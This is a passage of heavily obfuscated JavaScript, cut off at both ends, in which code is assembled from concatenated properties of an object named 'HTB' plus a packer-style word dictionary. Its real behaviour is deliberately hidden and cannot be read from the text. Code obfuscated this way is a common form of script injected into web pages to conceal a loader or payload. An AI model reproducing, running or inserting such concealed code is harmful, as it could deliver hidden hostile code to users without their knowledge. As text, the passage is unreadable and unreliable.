._$$+HTB.$___+"\\\\',\\\\'"+HTB._$_+HTB.$__+HTB._$_+"\\\\')]="+HTB.$__$+"(\\\\'"+HTB.$__+HTB.__$+HTB.$_$+"\\\\',\\\\')"+HTB.$__+HTB.__$+HTB._$_+"\\\\'),"+HTB.__$+HTB.$_$+"["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB.__$+HTB.__$+"\\\\',\\\\'"+HTB._$_+HTB._$_+HTB.$__$+"^"+HTB._$_+HTB._$_+HTB.$___+"\\\\')]="+HTB.$__$+"(\\\\'"+HTB.$__+HTB.___+HTB.$$$+"\\\\',\\\\'"+HTB.$__+HTB.___+HTB.$___+"\\\\'),"+HTB.__$+HTB.$_$+"["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB.___+HTB.$__$+"\\\\',\\\\'"+HTB.__$+HTB.__$+HTB._$$+"\\\\')]=\\\\'"+HTB.$__+HTB.__$+HTB.___+"\\\\',"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB._$$+HTB.$__$+HTB.$__+"\\\\',\\\\'"+HTB.$__+HTB._$$+"\\\\')]="+HTB.__$+HTB.___+"(\\\\'"+HTB._$$+HTB.$__$+HTB._$$+"\\\\',\\\\'"+HTB._$$+HTB.$$$+HTB.$___+"\\\\'),"+HTB.__$+HTB.$_$+"["+HTB.__$+HTB.___+"(\\\\'"+HTB._$_+HTB.$__$+"\\\\',\\\\'"+HTB.$$_+HTB.___+"\\\\')]="+HTB.$$$+"("+HTB._$_+HTB._$_+HTB._$$+","+HTB._$_+HTB._$_+HTB._$_+"){"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB._$_+HTB._$_+HTB._$$+"&lt;"+HTB._$_+HTB._$_+HTB._$_+"},"+HTB.__$+HTB.$_$+"["+HTB.__$+HTB.___+"(\\\\'"+HTB._$$+HTB.$$$+HTB.$__$+"\\\\',\\\\'"+HTB.$_$+HTB.$_$+"]"+HTB.$_$+HTB.$__+"\\\\')]="+HTB.__$+HTB.___+"(\\\\'"+HTB._$_+HTB._$_+HTB.__$+"\\\\',\\\\'"+HTB._$_+HTB._$$+HTB._$_+"[\\\\'),"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB.__$+HTB.$$$+HTB.$_$+"\\\\',\\\\'"+HTB.$__+HTB._$$+"\\\\')]="+HTB.__$+HTB.___+"(\\\\'"+HTB._$$+HTB.$___+HTB.___+"\\\\',\\\\'"+HTB._$_+HTB._$_+HTB.$$$+"\\\\'),"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB._$$+HTB.$___+HTB.__$+"\\\\',\\\\'"+HTB._$_+HTB._$_+HTB.$$_+"$\\\\')]=\\\\'"+HTB.$_$+"|"+HTB.$__+"|"+HTB.___+"|"+HTB.__$+"|"+HTB._$$+"|\\\\'+\\\\'"+HTB._$_+"\\\\';"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$__+"="+HTB.__$+HTB.$_$+","+HTB._$_+HTB._$$+HTB.$$_+"="+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$_+HTB._$_+"="+HTB.$__$+","+HTB._$_+HTB.__$+HTB.$___+"="+HTB.__$+HTB.___+","+HTB.$$_+HTB.__$+";"+HTB._$$+HTB.$$$+HTB.$$$+"{"+HTB.$$_+HTB.__$+"="+HTB.__$+HTB.$__+"["+HTB._$_+HTB._$_+"(\\\\'"+HTB.__$+HTB.$$$+HTB.__$+"\\\\',\\\\'"+HTB._$$+HTB.$$$+HTB.$$_+"\\\\')]("+HTB._$$+HTB.$$$+HTB._$_+","+HTB.__$+HTB.$__+"[\\\\'"+HTB._$$+HTB.$$$+HTB._$$+"\\\\']("+HTB.__$+HTB.$__+"["+HTB._$_+HTB._$_+"(\\\\'"+HTB._$_+HTB.__$+HTB.$_$+"\\\\',\\\\'(%"+HTB.$$$+HTB.$__$+"\\\\')]("+HTB.__$+HTB.$__+"["+HTB._$_+HTB._$_+"(\\\\'"+HTB._$$+HTB.$$$+HTB.$__+"\\\\',\\\\'"+HTB.__$+HTB.$___+HTB.$___+"\\\\')],"+HTB.__$+HTB.$__+"["+HTB._$_+HTB.__$+HTB.$___+"(\\\\'"+HTB._$$+HTB.$$$+HTB.$_$+"\\\\',\\\\'(%"+HTB.$$$+HTB.$__$+"\\\\')]),\\\\');\\\\'))()}"+HTB._$$+HTB.$___+HTB._$_+"("+HTB._$$+HTB.$___+HTB._$$+"){"+HTB.__$+HTB.$__$+"("+HTB.__$+HTB.$__+"["+HTB._$_+HTB._$_+"(\\\\'"+HTB._$$+HTB.$__$+HTB.___+"\\\\',\\\\'"+HTB.$$_+HTB.___+"\\\\')]("+HTB._$_+HTB._$_+"(\\\\'"+HTB._$$+HTB.$__$+HTB.__$+"\\\\',\\\\'"+HTB.__$+HTB.___+HTB.$$$+"\\\\'),"+HTB.__$+HTB.$__+"["+HTB._$_+HTB._$_+"(\\\\'"+HTB._$$+HTB.$__$+HTB._$_+"\\\\',\\\\'"+HTB.__$+HTB.___+HTB.$$$+"\\\\')])){"+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB._$$+HTB.$___+HTB.$__$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$_+HTB._$$+HTB.$__$+"="+HTB._$_+HTB._$_+";"+HTB.__$+HTB.$__$+"("+HTB._$$+HTB.$___+HTB.$___+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$_+HTB._$$+HTB._$$+"="+HTB._$$+HTB.$___+HTB.$__+"["+HTB._$_+HTB._$$+HTB.$__$+"(\\\\'"+HTB._$$+HTB.$___+HTB.$_$+"\\\\',\\\\'"+HTB._$_+HTB._$$+HTB._$_+"[\\\\')]("+HTB._$$+HTB.$___+HTB.$$_+","+HTB.$$_+HTB.$$_+");"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB._$$+HTB.$___+HTB.$$$+"="+HTB.$__+HTB.$_$+","+HTB._$_+HTB._$$+HTB._$$+"}}}"+HTB.$__+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB.$$_+HTB.__$+"="+HTB.$__+HTB.__$+HTB.$$_+"}"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$$_+HTB.__$+"},"+HTB.$__$+HTB._$$+"="+HTB._$_+HTB._$$+HTB.$$_+"(),"+HTB.__$+HTB.___+HTB._$_+"="+HTB.$__$+HTB._$$+"["+HTB.__$+HTB.___+"(\\\\'"+HTB._$_+HTB._$$+HTB.$_$+"\\\\',\\\\'"+HTB.$_$+HTB.$_$+"]"+HTB.$_$+HTB.$__+"\\\\')]="+HTB.$__$+HTB._$$+"["+HTB.$__$+"(\\\\'"+HTB.$__+HTB.__$+HTB.$$$+"\\\\',\\\\'"+HTB.$$_+HTB.___+"\\\\')]||{},"+HTB.$__$+HTB.$_$+"=["+HTB.__$+HTB.$__+"["+HTB.__$+HTB.___+"(\\\\'"+HTB._$_+HTB.__$+HTB.___+"\\\\',\\\\'"+HTB.$__+HTB.$__+HTB.$$$+"\\\\')],"+HTB.__$+HTB.$__+"["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB.$__+HTB.$___+"\\\\',\\\\'@"+HTB.$__+HTB.$__+HTB.$__$+"\\\\')],"+HTB.__$+HTB.$__+"["+HTB.$__$+"(\\\\'"+HTB.$__+HTB.$_$+HTB.___+"\\\\',\\\\'"+HTB.$_$+HTB.$_$+"]"+HTB.$_$+HTB.$__+"\\\\')],"+HTB.__$+HTB.$__+"["+HTB.$__$+"(\\\\'"+HTB.$__+HTB.$__+HTB.$$_+"\\\\',\\\\'(%"+HTB.$$$+HTB.$__$+"\\\\')],"+HTB.__$+HTB.$__+"["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB.$__+HTB.$_$+"\\\\',\\\\'"+HTB.__$+HTB.$___+HTB.$$_+"#\\\\')],"+HTB.__$+HTB.$__+"["+HTB.__$+HTB.___+"(\\\\'"+HTB.__$+HTB.$___+HTB.$__$+"\\\\',\\\\'"+HTB.__$+HTB.$$$+HTB._$$+"\\\\')],"+HTB.__$+HTB.$__+"["+HTB.__$+HTB.___+"(\\\\'"+HTB.$___+HTB.__$+"\\\\',\\\\'"+HTB.__$+HTB.$___+HTB.$___+"\\\\')]];"+HTB._$_+HTB.$__+"("+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$$$+HTB.$__+"=-"+HTB.$__+HTB.$__+HTB.__$+"*-"+HTB.__$+HTB.__$+"+"+HTB.$__+HTB.$__+HTB._$_+"+-"+HTB.$__+HTB.$__+HTB._$$+";"+HTB.__$+HTB.$__+"["+HTB.$__$+"(\\\\'"+HTB.$_$+HTB.$__$+"\\\\',\\\\'"+HTB.$__+HTB.$__+HTB.$__+"\\\\')]("+HTB.$$$+HTB.$__+","+HTB.$__$+HTB.$_$+"[\\\\'"+HTB._$_+HTB._$$+"\\\\']);"+HTB.$$$+HTB.$__+"++){"+HTB.__$+HTB.$__$+"("+HTB.__$+HTB.$__+"[\\\\'"+HTB.$__+HTB.$_$+HTB.__$+"\\\\']!=="+HTB.__$+HTB.$__+"["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB.$_$+HTB._$_+"\\\\',\\\\'"+HTB.$__+HTB.$_$+HTB.$__$+"\\\\')]){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$$$+HTB.$__$+"="+HTB.__$+HTB.$__+"["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB.$$_+HTB.___+"\\\\',\\\\'"+HTB.__$+HTB.$$$+HTB._$$+"\\\\')]["+HTB.$__$+"(\\\\'"+HTB.$__+HTB.$$_+HTB.__$+"\\\\',\\\\'"+HTB.$__+HTB.$_$+HTB.$___+"\\\\')](\\\\'|\\\\'),"+HTB.__$+HTB.$$$+HTB.$___+"=-"+HTB.$__+HTB.$_$+HTB.$$$+"*-"+HTB.__$+HTB.$$$+HTB._$_+"+"+HTB.__$+HTB.$$$+HTB.$_$+"+-"+HTB.$__+HTB.$_$+HTB._$$+";"+HTB.__$+HTB.$$$+HTB.$$_+"(!![]){"+HTB.$__+HTB.$_$+HTB.$__+"("+HTB.__$+HTB.$$$+HTB.$__$+"["+HTB.__$+HTB.$$$+HTB.$___+"++]){"+HTB._$$+HTB.__$+"\\\\'"+HTB.___+"\\\\':"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.__$+HTB.___+"="+HTB.__$+HTB.___+HTB._$_+"["+HTB.__$+HTB.__$+HTB.$__+"]||"+HTB._$$+HTB.$$$+";"+HTB._$$+HTB.___+";"+HTB._$$+HTB.__$+"\\\\'"+HTB.__$+"\\\\':"+HTB._$$+HTB.$$$+"["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB.$_$+HTB.$_$+"\\\\',\\\\'"+HTB.$_$+HTB.$_$+"]"+HTB.$_$+HTB.$__+"\\\\')]="+HTB._$$+HTB._$$+"["+HTB.$__$+"(\\\\'"+HTB.$__+HTB.$_$+HTB.$$_+"\\\\',\\\\'"+HTB.$__+HTB._$$+"\\\\')]("+HTB._$$+HTB._$$+");"+HTB._$$+HTB.___+";"+HTB._$$+HTB.__$+"\\\\'"+HTB._$_+"\\\\':"+HTB.__$+HTB.___+HTB._$_+"["+HTB.__$+HTB.__$+HTB.$__+"]="+HTB._$$+HTB.$$$+";"+HTB._$$+HTB.___+";"+HTB._$$+HTB.__$+"\\\\'"+HTB._$$+"\\\\':"+HTB._$$+HTB.$$$+"["+HTB.$__$+"(\\\\'"+HTB.__$+HTB.__$+"\\\\',\\\\'"+HTB.$__+HTB.$__+HTB.___+"\\\\')]="+HTB.__$+HTB.__$+HTB.___+"[\\\\'"+HTB.$$_+HTB.$__$+"\\\\']["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB._$$+HTB.$__$+"\\\\',\\\\'"+HTB.__$+HTB.$__$+HTB.$_$+"&amp;"+HTB.__$+HTB.$__$+HTB.$$_+"\\\\')]("+HTB.__$+HTB.__$+HTB.___+");"+HTB._$$+HTB.___+";"+HTB._$$+HTB.__$+"\\\\'"+HTB.$__+"\\\\':"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.__$+HTB.$__+"="+HTB.$__$+HTB.$_$+"["+HTB.$$$+HTB.$__+"];"+HTB._$$+HTB.___+";"+HTB._$$+HTB.__$+"\\\\'"+HTB.$_$+"\\\\':"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$$+HTB.$$$+"="+HTB._$$+HTB._$$+"[\\\\'"+HTB.$__$+HTB.$__+"\\\\'+\\\\'"+HTB.$___+HTB._$$+"\\\\']["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB._$_+HTB.$__+"\\\\',\\\\'"+HTB._$_+HTB.___+HTB._$$+"\\\\')]["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB._$_+HTB.$_$+"\\\\',\\\\'!"+HTB._$_+HTB.___+HTB._$_+"\\\\')]("+HTB._$$+HTB._$$+");"+HTB._$$+HTB.___+"}"+HTB.$__+HTB._$_+HTB.$$_+"}}"+HTB.$__+HTB.$$$+"{"+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB.$__+HTB._$_+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$_+HTB.___+HTB.$$$+"="+HTB.$__+HTB._$_+HTB._$$+"[\\\\'"+HTB._$_+HTB.___+HTB.$___+"\\\\']("+HTB.$__+HTB._$_+HTB._$_+","+HTB.$$_+HTB.$$_+");"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$__+HTB.__$+HTB.$___+"="+HTB.$__+HTB.$_$+","+HTB._$_+HTB.___+HTB.$$$+"}}}});"+HTB._$_+HTB.___+HTB.__$+"(),"+HTB.__$+HTB.$$_+HTB.__$+"="+HTB._$$+HTB.$___+"(\\\\'"+HTB.$__+HTB.__$+HTB.$__$+"\\\\',\\\\'("+HTB.$__+HTB._$_+HTB.___+"\\\\')+"+HTB._$$+HTB.$___+"(\\\\'"+HTB.__$+HTB.___+HTB.$_$+"\\\\',\\\\'"+HTB.$__+HTB._$_+HTB.__$+"\\\\')+"+HTB._$$+HTB.$___+"(\\\\'"+HTB.$__+HTB._$_+HTB.$___+"\\\\',\\\\'"+HTB.$__+HTB._$_+HTB.$__$+"["+HTB.$__+HTB._$$+HTB.$$_+"\\\\')+"+HTB.__$+HTB.$__$+HTB._$_+"(\\\\'"+HTB.$__+HTB._$$+HTB.$$$+"\\\\',\\\\'"+HTB.__$+HTB.$__$+HTB.$_$+"&amp;"+HTB.__$+HTB.$__$+HTB.$$_+"\\\\')+"+HTB._$$+HTB.$___+"(\\\\'"+HTB.$__+HTB._$$+HTB.$___+"\\\\',\\\\'"+HTB.__$+HTB.$__$+HTB.$___+"\\\\');"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$__+HTB._$$+HTB.$_$+"("+HTB.$__+HTB._$$+HTB.$__+"."+HTB.$__+HTB._$$+HTB.___+"({"+HTB.$__+HTB._$$+HTB.__$+":"+HTB._$_+HTB.___+HTB.$$_+","+HTB.$__+HTB._$$+HTB._$_+":"+HTB.__$+HTB.$__$+HTB.___+","+HTB.$__+HTB._$$+HTB._$$+":"+HTB.__$+HTB.$$_+HTB.__$+"}))}',"+HTB.__$+HTB.___+","+HTB.$_$+HTB.$_$+HTB.$__+",'||||||\\"+HTB.__$+HTB.$$_+HTB.$$_+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB._$_+"|"+HTB.$$$$+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$__+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"|\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+HTB.__+HTB._+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB._$$+HTB._$_+HTB.__$+HTB.$$__+HTB.$___+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.___+HTB.$$$$+HTB.$$_+HTB.___+HTB.$_$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$_$+HTB.$__+HTB.$__$+HTB._$_+HTB.$_$_+"|"+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+HTB._$_+HTB.$$__+HTB.$$$_+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+HTB._$$+HTB.$_$_+HTB.$_$_+HTB.$$_$+HTB.__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$_+HTB.$_$+HTB.$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$$$+HTB.$$_+HTB._$_+HTB.$$$+HTB.$$_+"|\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.___+"|\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.__$+HTB._$_+HTB._$_+HTB.$$$_+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.___+HTB.$$__+HTB.$$$+HTB.$$_$+HTB._$_+"|"+(![]+"")[HTB._$_]+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.___+"|"+HTB.$$$$+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+HTB._$$+HTB.$$$+HTB.$_$+HTB.__$+"|"+HTB.$$__+"\\"+HTB.__$+HTB._$$+HTB.__$+"\\"+HTB.__$+HTB._$$+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB.$$$_+HTB.$$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$$_+HTB.$__$+HTB.$$__+HTB.$$$_+HTB.___+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__$+HTB.__$+HTB.$$$$+HTB.$__$+HTB.$$__+HTB.$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+"|"+HTB.$$__+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB._+HTB.$$$_+"|"+HTB.$$__+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$$_+HTB.$_$_+HTB.$_$$+HTB.___+HTB.$$__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$__+HTB._$_+HTB.$$$_+HTB.$$__+HTB.$___+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$$_$+HTB.$___+HTB.$__$+HTB.$$_$+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$__+HTB.$$__+HTB.$__+HTB.$$_+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__+HTB.$_$_+HTB.$_$+HTB.$$_$+HTB.$__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$$+HTB.$_$$+HTB.$$$+HTB.$___+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$_+HTB.$$_$+HTB._$$+HTB.$$_+HTB.$_$+"|\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$$+HTB.$$$+HTB.$$__+HTB.$_$_+HTB.$_$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$_+HTB.$$_$+HTB.$$$_+HTB.$$__+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$+HTB.$$$$+HTB.$$$+HTB.$$$$+HTB.$$$$+"|\\"+HTB.__$+HTB.$$_+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB._$$+HTB._$_+"|\\"+HTB.__$+HTB.$$_+HTB.$$_+HTB.$_$_+(![]+"")[HTB._$_]+HTB._+HTB.$$$_+"|\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB._+(![]+"")[HTB._$_]+(![]+"")[HTB._$_]+"|"+HTB.$$_$+HTB._$+HTB.$$__+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.__+"|"+HTB.$$$_+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_+HTB.$_$$+HTB.___+HTB.$_$+HTB.$_$$+HTB.$$_$+"|\\"+HTB.__$+HTB.$__+HTB.$$$+HTB.$$$_+HTB.__+"\\"+HTB.__$+HTB.___+HTB.$_$+(![]+"")[HTB._$_]+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.__+"\\"+HTB.__$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB.__$+HTB.$$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$$+HTB.$$__+HTB.$_$+HTB._$_+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+HTB.$_$$+HTB.__$+HTB._$$+HTB.$$__+"|\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$$__+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"|\\"+HTB.__$+HTB._$$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB.$__+"|"+HTB._+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+HTB.$__$+HTB.$__$+HTB.$_$$+HTB.$_$$+HTB.$__+"|"+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$_$+HTB.$$$_+HTB.$$$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$$_+HTB.$$_$+"|\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+"|"+HTB._$$+"\\"+HTB.__$+HTB._$$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB.___+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$__$+HTB.___+HTB.$_$$+HTB.$$$$+HTB.$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$__+HTB.$__$+HTB.$__+HTB.$$$_+HTB.___+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$__$+HTB.$_$$+HTB.$$_$+HTB.__$+HTB.$__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$_+HTB.$_$$+HTB.$_$$+HTB.$$__+HTB.$__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$$_+HTB.$_$_+HTB.__$+HTB.___+HTB.$$_$+"|"+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.__+"\\"+HTB.__$+HTB.$$_+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$_+HTB.$__$+HTB.$___+HTB.$$$+HTB.$$__+"|\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"|"+HTB.__+HTB._$+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB.__+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$__$+HTB.$$$$+HTB.$__$+HTB.$$$+HTB.$__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$__+HTB._$$+HTB.$$__+HTB.$$__+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$_$_+HTB.$$_+HTB.$$_+HTB.$$__+HTB.___+"|\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$$__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$___+HTB.$$_$+HTB.$___+HTB.$$__+HTB.$___+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.__$+HTB._$$+HTB.$$__+HTB.$_$+HTB.$_$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__$+HTB.$_$_+HTB.$$__+HTB.$$$$+HTB.$__$+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$$$+HTB.$$$+HTB.$__+HTB.$___+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$_$$+HTB.$$_$+HTB.$$$_+HTB.$$_$+HTB.__$+"|\\"+HTB.__$+HTB.$$_+HTB.__$+HTB.$$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$__$+HTB.$___+HTB.$$__+HTB.$$_+HTB.$___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$$+HTB.___+HTB.$$_$+HTB.$__+HTB.$___+"|\\"+HTB.__$+HTB.$$_+HTB._$_+"|"+HTB.$$__+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+HTB.$$_$+HTB.$$$_+"\\"+HTB.__$+HTB.___+HTB.__$+HTB.__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.___+HTB.$$$_+HTB.$__$+HTB.$_$$+HTB.$__$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$$+HTB.$$_$+HTB.$$_$+HTB.$$$_+HTB.$$_$+"|\\"+HTB.__$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB.$$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$__+HTB.$__$+HTB.$___+HTB.$_$$+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$$$+HTB.$$_+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$_+HTB._$_+HTB.$$$$+HTB._$_+HTB.$_$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$$+HTB.___+HTB.$_$_+HTB.$$$_+HTB.$__$+"|\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB.$$_+HTB.$$$_+"\\"+HTB.__$+HTB.___+HT